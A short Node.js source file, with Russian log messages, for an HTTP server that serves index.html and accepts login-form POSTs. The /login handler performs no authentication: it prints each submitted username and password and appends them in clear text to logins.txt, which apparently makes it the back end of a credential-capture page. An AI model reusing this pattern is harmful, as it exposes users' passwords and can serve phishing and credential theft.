var http = require('http');
var url = require('url');
var fs = require('fs');


http.createServer(function(req, res) {
    var path = url.parse(req.url).pathname;

    if (req.method === 'GET' && path === '/') {
        fs.readFile('index.html', function(err, data) {
            if (err) {
                console.log(err);
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('Not Found!');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.write(data.toString());
                console.log('data was sent');
                res.end();
            }
        });
    } 
    else if (req.method === 'POST' && path === '/login') {
        let body = '';
        req.on('data', function(chunk) {
            body += chunk;
        });

        req.on('end', function() {
            var postData = new URLSearchParams(body);

            var login = postData.get('login');
            var password = postData.get('password');

            console.log('Логин: ' + login);
            console.log('Пароль: ' + password);
            var logData = `Логин: ${login}, Пароль: ${password}\n`;

            fs.appendFile('logins.txt', logData, function(err) {
                if (err) {
                    console.log('Ошибка при записи в файл:', err);
                } else {
                    console.log('Данные успешно записаны в файл.');
                }
            });
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Login and password received');
        });
    } 
    else {

        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found!');
    }
}).listen(8080, function() {
    console.log('Server starting!');
});
